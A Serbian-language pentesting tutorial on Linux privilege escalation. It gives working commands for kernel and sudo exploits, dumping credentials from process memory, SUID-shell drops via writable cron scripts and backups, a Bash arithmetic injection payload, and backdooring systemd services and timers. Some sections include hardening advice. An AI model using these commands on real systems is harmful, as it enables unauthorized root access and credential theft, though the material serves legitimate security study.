# Linux eskalacija privilegija

{{#include ../../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo prikupljanjem informacija o OS-u koji radi
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Ako imate **dozvole za pisanje u bilo kojoj fascikli unutar promenljive `PATH`**, možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim fajlovima:
```bash
echo $PATH
```
### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u promenljivama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji exploit koji se može koristiti za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Dobar spisak ranjivih kernel verzija i neki već **compiled exploits** možete pronaći ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa tog sajta, možete koristiti:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u pretrazi kernel exploit-a su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti IN victim, proverava samo exploit-e za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

Dodatne tehnike eksploatacije kernela:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacija privilegija na Linux-u - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo-a ranjiva pomoću ovog grep-a.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo verzije pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju neprivilegovanim lokalnim korisnicima da eskaliraju svoje privilegije na root putem sudo opcije `--chroot` kada se datoteka `/etc/nsswitch.conf` koristi iz direktorijuma kojim upravlja korisnik.

Ovde je dostupan [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za iskorišćavanje te [ranjivosti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita proverite da li je vaša verzija `sudo` ranjiva i da li podržava funkciju `chroot`.

Za više informacija pogledajte originalni [savet o ranjivosti](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Zaobilaženje sudo pravila zasnovanih na hostu (CVE-2025-32462)

Sudo pre verzije 1.9.17p1 (prijavljeni opseg pogođenih verzija: **1.8.8–1.9.17**) može da proverava sudoers pravila zasnovana na hostu koristeći **hostname koji prosleđuje korisnik** iz `sudo -h <host>`, umesto **stvarnog hostname-a**. Ako sudoers dodeljuje šire privilegije na drugom hostu, možete lokalno da **spoof-ujete** taj host.

Zahtevi:
- Ranjiva verzija sudo
- Sudoers pravila specifična za host (host nije ni trenutni hostname ni `ALL`)

Primer sudoers obrasca:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit lažiranjem dozvoljenog hosta:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ako se rezolucija lažiranog imena blokira, dodajte ga u `/etc/hosts` ili koristite hostname koji se već pojavljuje u logovima/konfiguracijama kako biste izbegli DNS upite.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Provera potpisa za dmesg nije uspela

Pogledajte **smasher2 box na HTB-u** za **primer** kako je ova ranjivost mogla biti iskorišćena
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dodatna enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerišite moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Izlazak iz containera

Ako se nalazite unutar containera, počnite od sledeće sekcije o container-security, a zatim pređite na stranice o zloupotrebi specifičnoj za runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano i demontirano**, gde i zašto. Ako je nešto demontirano, možete pokušati da ga montirate i proverite da li sadrži privatne informacije.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Koristan softver

Nabrojte korisne binarne fajlove
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je **instaliran neki compiler**. Ovo je korisno ako treba da upotrebite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instalirani ranjivi softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagiosa (na primer) koja bi mogla da se iskoristi za eskalaciju privilegija…\
Preporučuje se da ručno proverite verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete koristiti i **openVAS** za proveru zastarelog i ranjivog software-a instaliranog na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, zato se preporučuje korišćenje aplikacija kao što je OpenVAS ili sličnih aplikacija koje će proveriti da li je neka instalirana verzija software-a ranjiva na poznate exploite_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda se tomcat izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md), jer biste mogli da ih zloupotrebite za **escalate privileges**. **Linpeas** ih detektuje proverom parametra `--inspect` unutar komandne linije procesa.\
Takođe **proverite svoje privilegije nad binarnim datotekama procesa**, možda možete da ih prepišete.

### Lanci parent-child procesa

Child proces koji se izvršava pod **drugim korisnikom** od svog parent procesa nije automatski malicious, ali predstavlja koristan **triage signal**. Neki prelazi su očekivani (`root` pokreće service user, login manager kreira session procese), ali neuobičajeni lanci mogu otkriti wrappers, debug helpers, persistence ili slabe granice poverenja tokom izvršavanja.

Brzi pregled:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ako pronađete iznenađujući lanac, pregledajte komandnu liniju nadređenog procesa i sve fajlove koji utiču na njegovo ponašanje (`config`, `EnvironmentFile`, helper skripte, radni direktorijum, argumente nad kojima imate pravo upisa). U nekoliko stvarnih privesc putanja, sam child proces nije bio podložan upisu, ali su **config kojim upravlja parent proces** ili lanac helpera bili podložni upisu.

### Obrisani izvršni fajlovi i obrisani, a otvoreni fajlovi

Runtime artefakti su često i dalje dostupni **nakon brisanja**. Ovo je korisno i za privilege escalation i za oporavak dokaza iz procesa koji već ima otvorene osetljive fajlove.

Proverite obrisane izvršne fajlove:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ako `/proc/<PID>/exe` pokazuje na `(deleted)`, proces i dalje pokreće staru binarnu sliku iz memorije. To je snažan signal za istragu zato što:

- uklonjivi executable može sadržati zanimljive stringove ili credentiale
- pokrenuti proces i dalje može izlagati korisne file descriptore
- obrisani privilegovani binary može ukazivati na nedavne izmene ili pokušaj čišćenja

Prikupite globalno otvorene obrisane datoteke:
```bash
lsof +L1
```
Ako pronađete zanimljiv deskriptor, direktno ga preuzmite:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ovo je naročito korisno kada proces još uvek ima otvoren obrisani secret, script, izvoz baze podataka ili flag fajl.

### Praćenje procesa

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada je ispunjen skup zahteva.

### Memorija procesa

Neki servisi servera čuvaju **credentials u clear text formatu unutar memorije**.\
Obično su vam potrebne **root privilegije** za čitanje memorije procesa koji pripadaju drugim korisnicima, zbog čega je ovo obično korisnije kada već imate root pristup i želite da otkrijete još credentials.\
Međutim, imajte na umu da **kao regularan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da danas većina mašina **podrazumevano ne dozvoljava ptrace**, što znači da ne možete dump-ovati druge procese koji pripadaju vašem unprivileged korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace-a:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu da se debaguju, pod uslovom da imaju isti uid. Ovo je klasičan način funkcionisanja ptrace-a.
> - **kernel.yama.ptrace_scope = 1**: samo parent proces može da se debaguje.
> - **kernel.yama.ptrace_scope = 2**: samo administrator može da koristi ptrace, jer je potrebna CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može da se prati pomoću ptrace-a. Kada se jednom podesi, potrebno je restartovati sistem da bi se ptrace ponovo omogućio.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer), mogli biste da preuzmete Heap i pretražite njegove credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane oblasti**. Pseudo-fajl **mem izlaže samu memoriju procesa**. Iz fajla **maps** znamo koje su **memorijske oblasti čitljive** i njihove offsete. Ove informacije koristimo da **pozicioniramo pokazivač unutar mem fajla i izbacimo sve čitljive oblasti** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelnom adresnom prostoru kernela može se pristupiti koristeći /dev/kmem.\
Obično je `/dev/mem` dostupan samo za čitanje korisniku **root** i grupi **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za linux

ProcDump je Linux redizajniran prikaz klasičnog alata ProcDump iz paketa alata Sysinternals za Windows. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za izuzimanje memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahtev za root privilegijama i izuzeti proces čiji ste vlasnik
- Skripta A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako utvrdite da je authenticator proces pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete napraviti dump procesa (pogledajte prethodne odeljke da pronađete različite načine za dump memorije procesa) i pretražiti credentials unutar memorije:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih datoteka**. Za pravilan rad su mu potrebne root privilegije.

| Funkcija                                           | Naziv procesa         |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                   | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (aktivne SSH sesije - korišćenje Sudo-a)        | sshd:                |

#### Regex pretrage/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) koji radi kao root – web-based scheduler privesc

Ako web panel „Crontab UI“ (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti pomoću SSH local port-forwarding-a i kreirati privilegovani posao za eskalaciju privilegija.

Tipičan lanac
- Otkrijte port dostupan samo preko loopback-a (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađite kredencijale u operativnim artefaktima:
- Backup-ovima/skriptama sa `zip -P <password>`
- systemd unit-u koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Uspostavite tunel i prijavite se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreirajte job sa visokim privilegijama i odmah ga pokrenite (kreira SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nemoj pokretati Crontab UI kao root; ograniči ga pomoću namenski kreiranog korisnika i minimalnih dozvola
- Poveži ga sa localhost i dodatno ograniči pristup pomoću firewall/VPN-a; nemoj ponovo koristiti lozinke
- Izbegavaj ugrađivanje secrets u unit fajlove; koristi secret stores ili EnvironmentFile dostupan samo root korisniku
- Omogući audit/logging za izvršavanja on-demand job-ova



Proveri da li je neki zakazani job ranjiv. Možda možeš iskoristiti script koji se izvršava kao root (wildcard vuln? možeš li da izmeniš fajlove koje root koristi? da koristiš symlinks? da kreiraš određene fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ako se koristi `run-parts`, proverite koja imena će se zaista izvršiti:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Ovim se izbegavaju lažno pozitivni rezultati. Direktorijum za periodično izvršavanje u koji može da se upisuje koristan je samo ako se naziv vašeg payload fajla poklapa sa lokalnim pravilima za `run-parts`.

### Cron putanja

Na primer, unutar _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju na to da korisnik "user" ima prava pisanja nad direktorijumom /home/user_)

Ako root korisnik unutar ovog crontab-a pokuša da izvrši neku komandu ili script bez postavljanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
onda možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skriptu sa džoker znakom (Wildcard Injection)

Ako root izvršava skriptu koja unutar neke komande ima „**\***“, možete to iskoristiti da izazovete neočekivane stvari (kao što je privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard ispred putanje kao što je** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za još trikova za eksploataciju wildcard-a:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection u cron log parserima

Bash izvršava parameter expansion i command substitution pre aritmetičke evaluacije u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana polja iz logova i prosleđuje ih u aritmetički kontekst, napadač može da ubaci command substitution $(...) koji se izvršava kao root kada se cron pokrene.

- Zašto funkcioniše: U Bash-u se expansions izvršavaju sledećim redosledom: parameter/variable expansion, command substitution, arithmetic expansion, a zatim word splitting i pathname expansion. Zato se vrednost poput `$(/bin/bash -c 'id > /tmp/pwn')0` prvo zameni (pri čemu se komanda izvršava), a zatim se preostala numerička vrednost `0` koristi za aritmetiku, tako da se skripta nastavlja bez grešaka.

- Tipičan ranjivi obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Naterajte da se tekst pod kontrolom napadača upiše u parsirani log tako da polje koje izgleda kao broj sadrži command substitution i završava se cifrom. Uverite se da vaša komanda ne ispisuje ništa na stdout (ili preusmerite taj izlaz) kako bi aritmetika ostala validna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Prepisivanje cron skripte i symlink

Ako **možete da izmenite cron skriptu** koju izvršava root, shell možete dobiti veoma lako:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum kojem imate potpun pristup**, možda bi bilo korisno obrisati taj folder i **kreirati symlink folder ka drugom** koji sadrži skriptu pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Provera symbolic linkova i bezbednije rukovanje datotekama

Prilikom pregleda privilegovanih skripti/binarnih datoteka koje čitaju ili upisuju datoteke na osnovu putanje, proverite kako se obrađuju linkovi:

- `stat()` prati symbolic link i vraća metapodatke cilja.
- `lstat()` vraća metapodatke samog linka.
- `readlink -f` i `namei -l` pomažu u razrešavanju krajnjeg cilja i prikazuju dozvole svake komponente putanje.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Za defenders/developers, bezbedniji obrasci protiv symlink trikova uključuju:

- `O_EXCL` sa `O_CREAT`: neuspeh ako putanja već postoji (blokira unapred kreirane linkove/datoteke napadača).
- `openat()`: rad relativno u odnosu na file descriptor pouzdanog direktorijuma.
- `mkstemp()`: atomsko kreiranje privremenih datoteka sa bezbednim dozvolama.

### Binarne datoteke za cron sa payload-ima koji mogu da se menjaju

Blue teams ponekad „potpisuju” binarne datoteke koje pokreće cron tako što izdvoje prilagođenu ELF sekciju i pre izvršavanja kao root proveravaju vendor string pomoću grep-a. Ako je ta binarna datoteka upisiva za grupu (npr. `/opt/AV/periodic-checks/monitor` u vlasništvu `root:devs 770`) i možete leak signing material, možete falsifikovati sekciju i preuzeti cron task:

1. Koristite `pspy` da uhvatite tok verifikacije. Na mašini Era, root je pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, zatim `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, a potom izvršio datoteku.
2. Ponovo kreirajte očekivani sertifikat koristeći procureli ključ/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Napravite malicious zamenu (npr. ubacite SUID bash ili dodajte svoj SSH ključ) i ugradite sertifikat u `.text_sig` tako da grep provera prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite binarnu datoteku koju pokreće raspored, uz očuvanje execute bitova:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće cron pokretanje; kada naivna provera potpisa uspe, vaš payload će se izvršiti kao root.

### Česti cron jobs

Možete nadgledati procese da biste pronašli procese koji se izvršavaju svakog 1, 2 ili 5 minuta. Možda to možete iskoristiti za privilege escalation.

Na primer, da **nadgledate svakih 0.1 s tokom 1 minuta**, **sortirate prema ređe izvršavanim komandama** i obrišete komande koje su se najviše puta izvršile, možete koristiti:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete koristiti i** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i izlistati svaki proces koji se pokrene).

### Root backup-i koji čuvaju mode bitove koje je postavio attacker (pg_basebackup)

Ako cron u vlasništvu root-a pokreće `pg_basebackup` (ili bilo kakvo rekurzivno kopiranje) nad direktorijumom baze podataka u koji možete da upisujete, možete postaviti **SUID/SGID binary** koji će biti ponovo kopiran kao **root:root**, sa istim mode bitovima, u izlaz backup-a.

Tipičan tok otkrivanja (kao DB user sa niskim privilegijama):
- Koristite `pspy` da uočite root cron koji svakog minuta poziva nešto poput `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potvrdite da je source cluster (npr. `/var/lib/postgresql/14/main`) upisiv za vas i da destination (`/opt/backups/current`) nakon izvršavanja job-a postaje u vlasništvu root-a.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Ovo funkcioniše zato što `pg_basebackup` čuva bitove dozvola za fajlove prilikom kopiranja klastera; kada ga pokrene root, odredišni fajlovi nasleđuju **vlasništvo root + SUID/SGID koje je izabrao napadač**. Svaka slična privilegovana backup/copy rutina koja čuva dozvole i upisuje podatke na izvršivu lokaciju je ranjiva.

### Nevidljivi cron poslovi

Moguće je kreirati cronjob **dodavanjem carriage return znaka posle komentara** (bez newline karaktera), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Da biste otkrili ovu vrstu prikrivenog unosa, pregledajte cron datoteke pomoću alata koji prikazuju kontrolne znakove:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servisi

### Writable _.service_ files

Proverite da li možete da pišete u neki `.service` fajl; ako možete, **možete ga izmeniti** tako da **izvršava** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate da se mašina rebootuje).\
Na primer, kreirajte svoj backdoor unutar .service fajla pomoću **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Imajte na umu da, ako imate **write permissions nad binarnim fajlovima koje servisi izvršavaju**, možete ih izmeniti i ubaciti backdoor, tako da se backdoor izvrši kada se servisi ponovo izvrše.

### systemd PATH - Relative Paths

PATH koji koristi **systemd** možete videti pomoću:
```bash
systemctl show-environment
```
Ako utvrdite da možete **pisati** u bilo koju fasciklu na putanji, možda ćete moći da **eskalirate privilegije**. Potrebno je da potražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa**, kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim kreirajte **executable** sa **istim imenom kao binary relativne putanje** unutar systemd PATH foldera u koji možete da pišete i kada se od servisa zatraži izvršavanje ranjive akcije (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću komande `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čiji se naziv završava sa `**.timer**`, a koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa za cron, jer imaju ugrađenu podršku za događaje zasnovane na kalendaru i monotone vremenske događaje, a mogu se izvršavati asinhrono.

Sve timers možete izlistati pomoću:
```bash
systemctl list-timers --all
```
### Tajmeri sa dozvolom izmene

Ako možete da izmenite timer, možete učiniti da izvrši neke od entiteta systemd.unit, kao što su `.service` ili `.target`.
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je naziv jedinice, čiji sufiks nije ".timer". Ako nije naveden, ova vrednost podrazumevano predstavlja service koji ima isto ime kao timer jedinica, izuzimajući sufiks. (Pogledajte iznad.) Preporučuje se da naziv aktivirane jedinice i naziv timer jedinice budu identični, izuzimajući sufiks.

Dakle, da biste zloupotrebili ovu dozvolu, potrebno je da:

- Pronađete neku systemd jedinicu (kao što je `.service`) koja **izvršava binary sa pravom upisa**
- Pronađete neku systemd jedinicu koja **izvršava relativnu putanju** i imate **privilegije upisa nad systemd PATH-om** (kako biste se predstavljali kao taj executable)

